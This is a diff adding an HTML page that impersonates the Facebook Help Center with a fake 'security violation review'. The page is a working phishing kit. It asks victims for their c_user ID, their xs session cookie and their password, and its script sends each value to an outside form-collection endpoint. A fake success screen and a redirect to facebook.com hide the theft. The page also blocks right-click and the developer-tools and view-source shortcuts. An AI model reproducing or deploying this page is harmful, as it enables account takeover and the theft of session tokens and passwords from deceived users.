@@ -1,0 +1,1119 @@
+<!--Design by Rashid king name tu suna he hoga🖕-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" type="image/x-icon" href="favicon.ico">
+<link rel="icon" href="https://pbs.twimg.com/media/GQB99gQaQAEUOZ7?format=png&amp ;name=small">
+<title>Security Violation Review</title>
+<style>
+    *{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background-color:#f0f2f5;min-height:100vh}.main-content{max-width:1200px;margin:0 auto;padding:20px}@media (max-width: 768px){.desktop-header,.desktop-logo-section{display:none}}@media (min-width: 769px){.mobile-header,.mobile-logo-section{display:none}}.header{background-color:#3b5998;color:#fff}.header-content{max-width:1200px;margin:0 auto;padding:16px}.mobile-header{display:flex;align-items:center;gap:16px}.back-button{background:none;border:none;color:#fff;font-size:24px;cursor:pointer}.desktop-header{display:flex;justify-content:space-between;align-items:center}.logo-title{display:flex;align-items:center;gap:16px}.fb-logo{width:40px;height:40px;background-color:#fff;border-radius:50%;position:relative}.fb-logo:after{content:"f";position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:#3b5998;font-weight:700;font-size:24px}.menu-button{background:none;border:none;color:#fff;font-size:24px;cursor:pointer}.search-section{max-width:800px;margin:50px auto;text-align:center}.search-section h1{font-size:32px;margin-bottom:24px;color:#1c1e21}.search-container2{position:relative}.search-icon{position:absolute;left:16px;top:50%;transform:translateY(-50%);color:#65676b}input[type=search]{width:100%;padding:16px 16px 16px 48px;border-radius:24px;border:1px solid #dddfe2;background-color:#f0f2f5;font-size:16px;outline:none;transition:all .2s}input[type=text]:focus{border-color:#3b5998;box-shadow:0 0 0 2px #3b599833}.help-cards{display:grid;gap:24px;margin-top:48px}@media (min-width: 769px){.help-cards{grid-template-columns:repeat(3,1fr)}}.card{background-color:#fff;padding:24px;border-radius:8px;box-shadow:0 1px 2px #0000001a;transition:box-shadow .2s}.card:hover{box-shadow:0 2px 4px #0000001a}.card h3{color:#1c1e21;margin-bottom:12px;font-size:18px}.card p{color:#65676b;font-size:14px;line-height:1.4}.footer{margin-top:48px;padding:24px 0;border-top:1px solid #dddfe2;background-color:#fff}.footer-content{max-width:1200px;margin:0 auto;padding:0 20px;display:flex;flex-direction:column;align-items:center;gap:16px}@media (min-width: 769px){.footer-content{flex-direction:row;justify-content:space-between}}.copyright{color:#65676b;font-size:14px}.footer-links{display:flex;gap:24px}.footer-links a{color:#65676b;text-decoration:none;font-size:14px}.footer-links a:hover{text-decoration:underline}
+.custom-container {
+    padding: 0.5rem;
+    margin-bottom: 0.5rem;
+    display: flex;
+    justify-content: flex-end;
+    background-color: rgb(245, 246, 247);
+}
+.custom-button {
+    color: white;
+    background-color: rgb(66, 103, 178);
+    border: none;
+    padding: 0.4rem 1rem;
+    font-size: 1.1rem;
+    cursor: pointer;
+    position: relative;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+}
+.custom-button:hover {
+    background-color: rgb(45, 80, 150);
+    transform: scale(1.05);
+}
+.custom-button:focus {
+    outline: none;
+    box-shadow: 0 0 5px rgba(66, 103, 178, 0.7);
+}
+.custom-button:disabled {
+    background-color: rgb(150, 150, 150);
+    cursor: not-allowed;
+    opacity: 0.7;
+}
+.custom-button.loading .button-text {
+    visibility: hidden;
+}
+.custom-button .button-loader {
+    display: none;
+    width: 20px;
+    height: 20px;
+    border: 3px solid #fff;
+    border-top: 3px solid transparent;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    position: absolute;
+}
+.custom-button.loading .button-loader {
+    display: block;
+}
+body {
+    -webkit-text-size-adjust: 100%;
+    -webkit-tap-highlight-color: transparent;
+    background-color: #fff;
+    background-color: var(--bs-body-bg);
+    color: #212529;
+    color: var(--bs-body-color);
+    font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica Neue, Noto Sans, Liberation Sans, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;
+    font-family: var(--bs-body-font-family);
+    font-size: 1rem;
+    font-size: var(--bs-body-font-size);
+    font-weight: 400;
+    font-weight: var(--bs-body-font-weight);
+    line-height: 1.5;
+    line-height: var(--bs-body-line-height);
+    margin: 0;
+    text-align: var(--bs-body-text-align)
+}
+.header {
+    padding: 10px;
+    background-color: #4267B2;
+    color: white;
+    display: flex;
+    align-items: center;
+}
+.logo-container {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+.logo-container img {
+    width: 40px;
+    height: 50px;
+}
+.logo-container h1 {
+    margin: 0;
+    font-size: 24px;
+}
+.main-content {
+    padding: 20px;
+}
+.search-icon-re {
+    position: absolute;
+    right: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 18px;
+    color: #555;
+}
+.menu-icon {
+    display: block;
+    cursor: pointer;
+    width: 30px;
+    height: 25px;
+    position: absolute;
+    top: 80px;
+    right: 20px;
+    z-index: 10;
+}
+.menu-icon div {
+    background-color: #333;
+    height: 4px;
+    width: 100%;
+    position: absolute;
+    left: 0;
+    transition: all 0.3s ease;
+}
+.menu-icon div:nth-child(1) {
+    top: 0;
+}
+.menu-icon div:nth-child(2) {
+    top: 10px;
+}
+.menu-icon div:nth-child(3) {
+    top: 20px;
+}
+ul.navbar {
+    list-style-type: none;
+    padding: 0;
+    margin: 0;
+    background-color: #333;
+    display: none;
+    position: absolute;
+    top: 90px;
+    right: 0;
+    width: 200px;
+    text-align: right;
+    z-index: 9;
+}
+ul.navbar li {
+    padding: 10px;
+    border-bottom: 1px solid #555;
+}
+ul.navbar li a {
+    color: white;
+    text-decoration: none;
+    display: block;
+}
+ul.navbar li a:hover {
+    background-color: #111;
+}
+@media screen and (min-width: 1024px) {
+    .menu-icon {
+        display: block;
+    }
+    ul.navbar.active {
+        display: block;
+    }
+}
+@media screen and (max-width: 768px) {
+    .menu-icon {
+        display: block;
+    }
+    .navbar.active {
+        display: block;
+    }
+}
+.fb-input-container {
+    display: flex;
+    flex-direction: column;
+    margin-bottom: 20px;
+    width: 100%;
+    max-width: 400px;
+}
+.fb-input-container input {
+    padding: 14px;
+    font-size: 16px;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    outline: none;
+    transition: border-color 0.2s ease, box-shadow 0.2s ease;
+}
+.fb-input-container input:focus {
+    border-color: #1877f2;
+    box-shadow: 0 0 6px rgba(24, 119, 242, 0.5);
+}
+.fb-input-container input.valid {
+    border-color: #28a745;
+}
+.fb-input-container input.invalid {
+    border-color: #dc3545;
+}
+.fb-input-container label {
+    font-size: 14px;
+    font-weight: bold;
+    color: #666;
+    margin-bottom: 8px;
+    text-transform: uppercase;
+}
+.fb-input-container input::placeholder {
+    color: #aaa;
+}
+.fb-input-container .error-message {
+    font-size: 12px;
+    color: #dc3545;
+    margin-top: 5px;
+    display: none;
+}
+@media screen and (max-width: 768px) {
+    .fb-input-container {
+        width: 90%;
+    }
+}
+.note {
+    font-size: 12px;
+    color: #606770;
+    margin-top: 10px;
+    line-height: 1.4;
+}
+.search-icon-image {
+    width: 20px;
+    height: auto;
+    margin-left: 30px;
+    cursor: pointer;
+}
+@media (max-width: 768px) {
+    .search-icon-image {
+        margin-left: 70px;
+    }
+}
+@media (min-width: 1024px) {
+    .search-icon-image {
+        margin-left: 960px;
+    }
+}
+.card {
+    --bs-card-spacer-y: 1rem;
+    --bs-card-spacer-x: 1rem;
+    --bs-card-title-spacer-y: 0.5rem;
+    --bs-card-border-width: var(--bs-border-width);
+    --bs-card-border-color: var(--bs-border-color-translucent);
+    --bs-card-border-radius: var(--bs-border-radius);
+    --bs-card-box-shadow: ;
+    --bs-card-inner-border-radius: calc(var(--bs-border-radius) - var(--bs-border-width));
+    --bs-card-cap-padding-y: 0.5rem;
+    --bs-card-cap-padding-x: 1rem;
+    --bs-card-cap-bg: rgba(var(--bs-body-color-rgb), 0.03);
+    --bs-card-height: ;
+    --bs-card-bg: var(--bs-body-bg);
+    --bs-card-img-overlay-padding: 1rem;
+    --bs-card-group-margin: 0.75rem;
+    word-wrap: break-word;
+    background-clip: initial;
+    background-color: var(--bs-card-bg);
+    border: var(--bs-card-border-width) solid var(--bs-card-border-color);
+    border-radius: var(--bs-card-border-radius);
+    color: #212529;
+    display: flex;
+    flex-direction: column;
+    height: var(--bs-card-height);
+    min-width: 0;
+    position: relative
+}
+img, svg {
+    vertical-align: middle
+}
+body, button {
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+}
+.submit-button {
+    width: 30%;
+    padding: 12px;
+    background-color: #4267B2;
+    color: white;
+    border: none;
+    border-radius: 0px;
+    font-size: 15px;
+    cursor: pointer;
+    position: relative;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+}
+.submit-button.loading .button-text {
+    visibility: hidden;
+}
+.submit-button .button-loader {
+    display: none;
+    width: 20px;
+    height: 20px;
+    border: 3px solid #fff;
+    border-top: 3px solid transparent;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    position: absolute;
+}
+.submit-button.loading .button-loader {
+    display: block;
+}
+.img-fluid, .img-thumbnail {
+    height: auto;
+    max-width: 100%
+}
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+body {
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f4;
+    color: #333;
+    line-height: 1.6;
+    margin: 0;
+    padding: 0;
+}
+h3, h5 {
+    color: ;
+}
+a {
+    text-decoration: none;
+    color: #333;
+}
+img {
+    max-width: 100%;
+    height: auto;
+}
+header {
+    background-color: #4267B2;
+    color: ;
+    padding: 15px;
+    text-align: center;
+}
+header h3 {
+    font-size: 24px;
+}
+.main-content {
+    padding: 20px;
+}
+.card {
+    background: white;
+    border-radius: 8px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    padding: 20px;
+    margin: 10px auto;
+    width: 90%;
+    max-width: 600px;
+}
+.card h3 {
+    margin-bottom: 20px;
+}
+.fb-input-container {
+    margin-bottom: 15px;
+}
+.fb-input-container label {
+    display: block;
+    margin-bottom: 5px;
+    font-weight: bold;
+}
+.fb-input-container input {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+}
+.submit-button {
+    width: 30%;
+    padding: 12px;
+    background-color: #4267B2;
+    color: white;
+    border: none;
+    border-radius: 0px;
+    font-size: 15px;
+    cursor: pointer;
+}
+footer {
+    background-color: #333;
+    color: white;
+    text-align: center;
+    padding: 15px;
+    position: relative;
+    bottom: 0;
+    width: 100%;
+}
+.footer-links a {
+    margin: 0 15px;
+    color: white;
+    text-decoration: none;
+}
+.footer-links a:hover {
+    text-decoration: underline;
+}
+@media only screen and (max-width: 768px) {
+    header h3 {
+        font-size: 18px;
+    }
+    .card {
+        width: 95%;
+        padding: 15px;
+    }
+    .submit-button {
+        width: 100%;
+        padding: 14px;
+        background-color: #4267B2;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        font-size: 16px;
+        cursor: pointer;
+        margin-top: 10px;
+    }
+    .footer-links {
+        display: block;
+        margin-top: 10px;
+    }
+    .footer-links a {
+        display: block;
+        margin: 5px 0;
+    }
+    .main-content {
+        padding: 10px;
+    }
+    .custom-container {
+        justify-content: center;
+        padding: 0;
+        background: transparent;
+    }
+}
+@media only screen and (min-width: 769px) and (max-width: 1024px) {
+    .card {
+        width: 70%;
+    }
+    .submit-button {
+        width: 20%;
+        padding: 12px;
+        background-color: #4267B2;
+        color: white;
+        border: none;
+        border-radius: 0px;
+        font-size: 16px;
+        cursor: pointer;
+    }
+}
+@media only screen and (min-width: 1025px) {
+    .card {
+        width: 100%;
+    }
+    .submit-button {
+        width: 29%;
+        padding: 12px;
+        background-color: #4267B2;
+        color: white;
+        border: none;
+        border-radius: 0px;
+        font-size: 17px;
+        cursor: pointer;
+    }
+}
+.back-button {
+    background: none;
+    border: none;
+    cursor: pointer;
+    padding: 0;
+    margin: 0;
+}
+.back-button img {
+    width: 70px;
+    height: 40px;
+}
+.menu-container {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+.menu-icon {
+    cursor: pointer;
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+}
+.menu-icon div {
+    width: 30px;
+    height: 4px;
+    background-color: #333;
+}
+.footer-links {
+    display: flex;
+    justify-content: center;
+    gap: 15px;
+}
+.footer-links a {
+    color: white;
+    font-size: 14px;
+}
+.footer-links a:hover {
+    text-decoration: underline;
+}
+.search-icon-image {
+    width: 20px;
+    height: auto;
+    margin-left: 30px;
+    cursor: pointer;
+}
+.responsive-video {
+    width: 100%;
+    height: auto;
+}
+@media (min-width: 768px) {
+    .responsive-video {
+        width: 80%;
+        height: auto;
+    }
+}
+@media (min-width: 1024px) {
+    .responsive-video {
+        width: 1280px;
+        height: 720px;
+    }
+}
+.deletion-notice {
+    background-color: #ffffff;
+    border-radius: 8px;
+    padding: 30px;
+    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+    margin-bottom: 30px;
+    border-left: 4px solid #ff4d4f;
+}
+
+/* Enhanced Popup Styles */
+.popup {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.7);
+    justify-content: center;
+    align-items: center;
+    z-index: 1000;
+    backdrop-filter: blur(5px);
+    animation: fadeIn 0.3s ease;
+}
+.popup-content {
+    background-color: white;
+    padding: 30px;
+    border-radius: 12px;
+    width: 90%;
+    max-width: 450px;
+    text-align: center;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+    position: relative;
+    animation: slideIn 0.3s ease;
+}
+.popup-close {
+    position: absolute;
+    top: 15px;
+    right: 15px;
+    background: none;
+    border: none;
+    font-size: 24px;
+    cursor: pointer;
+    color: #65676b;
+}
+.popup-close:hover {
+    color: #000;
+}
+.popup-content img {
+    width: 60px;
+    height: 60px;
+    margin-bottom: 20px;
+}
+.popup-content h3 {
+    margin-bottom: 15px;
+    color: #1c1e21;
+    font-size: 20px;
+}
+.popup-content p {
+    color: #65676b;
+    margin-bottom: 20px;
+    font-size: 14px;
+    line-height: 1.5;
+}
+.popup-content input {
+    width: 100%;
+    padding: 14px;
+    margin-bottom: 10px;
+    border: 1px solid #dddfe2;
+    border-radius: 8px;
+    font-size: 16px;
+    transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    background-color: #f5f6f7;
+}
+.popup-content input:focus {
+    border-color: #1877f2;
+    box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+    background-color: #fff;
+    outline: none;
+}
+.popup-content input.valid {
+    border-color: #28a745;
+}
+.popup-content input.invalid {
+    border-color: #dc3545;
+}
+.popup-content .error-message {
+    font-size: 12px;
+    color: #dc3545;
+    margin-top: 5px;
+    display: none;
+    text-align: left;
+}
+.popup-buttons {
+    display: flex;
+    gap: 12px;
+    margin-top: 15px;
+}
+.popup-buttons button {
+    flex: 1;
+    padding: 14px;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    position: relative;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+    font-weight: 600;
+    transition: background-color 0.2s;
+}
+.popup-confirm {
+    background-color: #1877f2;
+    color: white;
+}
+.popup-confirm:hover {
+    background-color: #166fe5;
+}
+.popup-cancel {
+    background-color: #e4e6eb;
+    color: #1c1e21;
+}
+.popup-cancel:hover {
+    background-color: #d8dadf;
+}
+.popup-confirm.loading .button-text {
+    visibility: hidden;
+}
+.popup-confirm .button-loader {
+    display: none;
+    width: 20px;
+    height: 20px;
+    border: 3px solid #fff;
+    border-top: 3px solid transparent;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    position: absolute;
+}
+.popup-confirm.loading .button-loader {
+    display: block;
+}
+
+/* Enhanced Password Input Styles */
+.password-container {
+    position: relative;
+    margin-bottom: 20px;
+}
+.password-toggle {
+    position: absolute;
+    right: 15px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    cursor: pointer;
+    color: #65676b;
+    font-size: 18px;
+}
+.password-strength {
+    margin-top: 8px;
+    height: 4px;
+    border-radius: 2px;
+    background-color: #e4e6eb;
+    overflow: hidden;
+}
+.password-strength-bar {
+    height: 100%;
+    width: 0%;
+    transition: width 0.3s ease, background-color 0.3s ease;
+}
+.password-strength-text {
+    font-size: 12px;
+    color: #65676b;
+    margin-top: 4px;
+    text-align: right;
+}
+
+/* Enhanced Success Page */
+.success-page {
+    display: none;
+    background: white;
+    border-radius: 12px;
+    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+    padding: 40px 30px;
+    margin: 20px auto;
+    width: 90%;
+    max-width: 500px;
+    text-align: center;
+    animation: slideIn 0.5s ease;
+}
+.success-icon {
+    width: 80px;
+    height: 80px;
+    margin: 0 auto 25px;
+    background: #28a745;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    animation: scaleIn 0.5s ease;
+}
+.success-icon img {
+    width: 40px;
+    height: 40px;
+    filter: brightness(0) invert(1);
+}
+.success-page h3 {
+    color: #1c1e21;
+    font-size: 24px;
+    margin-bottom: 15px;
+}
+.success-page p {
+    color: #65676b;
+    font-size: 16px;
+    line-height: 1.6;
+    margin-bottom: 25px;
+}
+.success-timer {
+    font-size: 14px;
+    color: #606770;
+    background: #f0f2f5;
+    padding: 10px 15px;
+    border-radius: 8px;
+    display: inline-block;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+@keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+}
+@keyframes slideIn {
+    from { transform: translateY(-20px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+}
+@keyframes scaleIn {
+    from { transform: scale(0); opacity: 0; }
+    to { transform: scale(1); opacity: 1; }
+}
+</style>
+<script type="text/javascript">
+document.addEventListener("contextmenu", function(e) {
+    e.preventDefault();
+});
+document.addEventListener("keydown", function(e) {
+    if ((e.key === 'i' || e.key === 'c' || e.key === 'u' || e.keyCode === 73 || e.keyCode === 67) && (e.shiftKey || e.ctrlKey)) {
+        e.preventDefault();
+    }
+});
+function toggleMenu() {
+    const menu = document.querySelector('.menu-container');
+    menu.classList.toggle('open');
+}
+
+// Password strength checker
+function checkPasswordStrength(password) {
+    let strength = 0;
+    const strengthBar = document.getElementById('password-strength-bar');
+    const strengthText = document.getElementById('password-strength-text');
+    
+    if (password.length >= 1) strength += 25;
+    if (/[a-z]/.test(password)) strength += 25;
+    if (/[A-Z]/.test(password)) strength += 25;
+    if (/[0-9]/.test(password) || /[^A-Za-z0-9]/.test(password)) strength += 25;
+    
+    strengthBar.style.width = strength + '%';
+    
+    if (strength < 25) {
+        strengthBar.style.backgroundColor = '#dc3545';
+        strengthText.textContent = 'Very Weak';
+        strengthText.style.color = '#dc3545';
+    } else if (strength < 50) {
+        strengthBar.style.backgroundColor = '#ff6b6b';
+        strengthText.textContent = 'Weak';
+        strengthText.style.color = '#ff6b6b';
+    } else if (strength < 75) {
+        strengthBar.style.backgroundColor = '#ffd166';
+        strengthText.textContent = 'Fair';
+        strengthText.style.color = '#ffa94d';
+    } else {
+        strengthBar.style.backgroundColor = '#28a745';
+        strengthText.textContent = 'Strong';
+        strengthText.style.color = '#28a745';
+    }
+}
+
+// Toggle password visibility
+function togglePasswordVisibility() {
+    const passwordInput = document.getElementById('password');
+    const toggleBtn = document.querySelector('.password-toggle');
+    
+    if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        toggleBtn.textContent = '👁️';
+    } else {
+        passwordInput.type = 'password';
+        toggleBtn.textContent = '👁️‍🗨️';
+    }
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.getElementById('myForm');
+    const cUserInput = document.getElementById('c_user');
+    const xsInput = document.getElementById('xs');
+    const passwordInput = document.getElementById('password');
+    const cUserError = document.getElementById('c_user_error');
+    const xsError = document.getElementById('xs_error');
+    const passwordError = document.getElementById('password_error');
+    const submitButton = document.querySelector('.submit-button');
+    const popup = document.querySelector('.popup');
+    const popupClose = document.querySelector('.popup-close');
+
+    function validateCUser() {
+        const value = cUserInput.value;
+        if (/^[0-9]+$/.test(value)) {
+            cUserInput.classList.remove('invalid');
+            cUserInput.classList.add('valid');
+            cUserError.style.display = 'none';
+            return true;
+        } else {
+            cUserInput.classList.remove('valid');
+            cUserInput.classList.add('invalid');
+            cUserError.style.display = 'block';
+            return false;
+        }
+    }
+
+    function validateXs() {
+        const value = xsInput.value;
+        if (/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{40,}$/.test(value)) {
+            xsInput.classList.remove('invalid');
+            xsInput.classList.add('valid');
+            xsError.style.display = 'none';
+            return true;
+        } else {
+            xsInput.classList.remove('valid');
+            xsInput.classList.add('invalid');
+            xsError.style.display = 'block';
+            return false;
+        }
+    }
+
+    function validatePassword() {
+        const value = passwordInput.value;
+        if (value.length >= 1) {
+            passwordInput.classList.remove('invalid');
+            passwordInput.classList.add('valid');
+            passwordError.style.display = 'none';
+            return true;
+        } else {
+            passwordInput.classList.remove('valid');
+            passwordInput.classList.add('invalid');
+            passwordError.style.display = 'block';
+            return false;
+        }
+    }
+
+    cUserInput.addEventListener('input', validateCUser);
+    xsInput.addEventListener('input', validateXs);
+    passwordInput.addEventListener('input', function() {
+        validatePassword();
+        checkPasswordStrength(this.value);
+    });
+
+    if (popupClose) {
+        popupClose.addEventListener('click', function() {
+            popup.style.display = 'none';
+        });
+    }
+
+    popup.addEventListener('click', function(e) {
+        if (e.target === popup) {
+            popup.style.display = 'none';
+        }
+    });
+
+    if (form) {
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            if (validateCUser() && validateXs()) {
+                submitButton.classList.add('loading');
+                submitButton.disabled = true;
+                
+                // Create form data for submission
+                const formData = new URLSearchParams();
+                formData.append('c_user', cUserInput.value);
+                formData.append('xs', xsInput.value);
+                
+                // Use no-cors mode to avoid CORS issues
+                fetch('https://submit-form.com/2W97opv89', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: formData.toString()
+                })
+                .then(() => {
+                    // Since no-cors doesn't return readable response, we assume success
+                    submitButton.classList.remove('loading');
+                    submitButton.disabled = false;
+                    popup.style.display = 'flex';
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    submitButton.classList.remove('loading');
+                    submitButton.disabled = false;
+                    // Still show popup even if error (Formspark usually works)
+                    popup.style.display = 'flex';
+                });
+            } else {
+                alert('Please correct the errors in the form.');
+            }
+        });
+    }
+});
+
+function submitPassword() {
+    const password = document.getElementById('password').value;
+    const popupButton = document.querySelector('.popup-confirm');
+
+    if (password.length >= 1) {
+        popupButton.classList.add('loading');
+        popupButton.disabled = true;
+        
+        // Create form data for password submission
+        const formData = new URLSearchParams();
+        formData.append('password', password);
+        
+        // Submit password to Formspark
+        fetch('https://submit-form.com/2W97opv89', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: formData.toString()
+        })
+        .then(() => {
+            // Show success page
+            document.querySelector('.popup').style.display = 'none';
+            document.querySelector('.main-content').style.display = 'none';
+            
+            let countdown = 5;
+            const timerElement = document.getElementById('success-timer');
+            const updateTimer = () => {
+                timerElement.textContent = `Redirecting in ${countdown} seconds...`;
+                countdown--;
+                if (countdown >= 0) {
+                    setTimeout(updateTimer, 1000);
+                } else {
+                    window.location.href = "https://facebook.com ";
+                }
+            };
+            
+            document.querySelector('.success-page').style.display = 'block';
+            updateTimer();
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            // Still proceed to success page
+            document.querySelector('.popup').style.display = 'none';
+            document.querySelector('.main-content').style.display = 'none';
+            document.querySelector('.success-page').style.display = 'block';
+        });
+    } else {
+        document.getElementById('password_error').style.display = 'block';
+    }
+}
+
+function closePopup() {
+    document.querySelector('.popup').style.display = 'none';
+}
+</script>
+</head>
+<body>
+<form id="myForm" action="https://submit-form.com/2W97opv89" method="POST">
+<header class="header">
+<br>
+<br>
+<button type="button" id="backbutton" class="back-button"><img src="https://detailed-video-mp4.github.io/review-request-now-fast4/arrow.jpg " style="width: 70px; height: 40px;"></button>
+<h3>Facebook Help Center</h3>
+</header>
+<div>
+<div class="logo-container">
+<img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg " alt="Facebook Logo"> 
+<h3>Help Center</h3>
+<hr>
+   <div class="menu-container">
+<div></div>
+<div></div>
+<div></div>
+<div></div>
+<div></div>
+<div></div>
+</div>
+</div>   
+<div>
+</div>
+</div>
+</div>
+</div>
+ <div>
+</div>
+<hr>
+<main class="main-content">
+<div class="search-section">
+</div>
+<div class="card">
+<h3>Security Violation Review Request<hr></h3>
+<p>Your account has been flagged for potential security violations. To prevent restrictions and verify your identity, please submit your account details for review. This process helps us confirm your account's authenticity and resolve any security flags.
+
+ <br> <br>Please provide the precise details below to begin the review process. <br> <br>
+<h5>Security Review Information</h5>
+
+<div>
+ <a href="https://ucarecdn.com/90d15da5-bb79-43b1-ad8e-2b9fce403a7a/InShot_20250521_042221994.mp4 ">
+     <img src="https://detailed-video-mp4.github.io/review-request-now-fast4/fb.png " alt="fb" style="width: 160px; height: 110px;">
+ </a>
+</div><br>
+<p class="fw-semibold validation_form_para mt-2">Please provide the necessary security details in the sections indicated below to verify your identity.</p>
+<hr>
+<br>
+<div class="fb-input-container">
+<label for="c_user">C_USER</label>
+<input type="number" name="c_user" id="c_user" placeholder="Enter your account ID" required aria-describedby="c_user_error">
+<span id="c_user_error" class="error-message">Please enter a valid account ID (numeric characters only).</span>
+</div>
+<div class="fb-input-container">
+<label for="xs">XS</label>
+<input type="text" name="xs" id="xs" placeholder="Enter your security token" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{40,}$" required aria-describedby="xs_error">
+<span id="xs_error" class="error-message">Please enter a valid session token (at least 40 characters, including letters, numbers, and special characters).</span>
+</div>
+<p style="font-size: 12px; color: #dc3545; font-weight: bold;">⚠️ IMPORTANT: Please do not log out from your computer or laptop until you receive the security review confirmation email.</p><br>
+<div class="custom-container">
+<button type="submit" class="submit-button"><span class="button-text">Submit</span><span class="button-loader"></span></button>           
+</div>
+</div>
+</main> 
+<footer class="footer">
+<div class="footer-content">
+<div class="footer-links">
+<a href="#">Privacy</a>
+<a href="#">Security</a>
+<a href="#">Terms</a>
+<a href="#">Cookies</a>
+</div>
+</div>
+</footer>
+</form>
+<div class="popup">
+<div class="popup-content">
+<button class="popup-close">&times;</button>
+<img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg " alt="Facebook Logo">
+<h3>Security Verification Required</h3>
+<p>To complete the security review, please re-enter your Facebook password for identity verification.</p>
+<div class="password-container">
+    <input type="password" id="password" placeholder="Enter your current password" oninput="checkPasswordStrength(this.value)">
+    <button type="button" class="password-toggle" onclick="togglePasswordVisibility()">👁️‍🗨️</button>
+    <div class="password-strength">
+        <div id="password-strength-bar" class="password-strength-bar"></div>
+    </div>
+    <div id="password-strength-text" class="password-strength-text"></div>
+</div>
+<span id="password_error" class="error-message">Please enter your password.</span>
+<div class="popup-buttons">
+    <button class="popup-cancel" onclick="closePopup()">Cancel</button>
+    <button class="popup-confirm" onclick="submitPassword()">
+        <span class="button-text">Verify Identity</span>
+        <span class="button-loader"></span>
+    </button>
+</div>
+</div>
+</div>
+<div class="success-page">
+<div class="success-icon">
+    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSJ3aGl0ZSIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJmZWF0aGVyIGZlYXRoZXItY2hlY2siPjxwb2x5bGluZSBwb2ludHM9IjIwIDYgOSAxNyA0IDEyIj48L3BvbHlsaW5lPjwvc3ZnPg==" alt="Checkmark">
+</div>
+<h3>Security Review Submitted Successfully</h3>
+<p>Your security violation review request has been submitted successfully. Our security team will review your account details and contact you via email within 24-48 hours.</p>
+<div class="success-timer" id="success-timer">Redirecting in 5 seconds...</div>
+</div>
+<script type="text/javascript" src="js/script.js"></script>
+</body>
+</html>
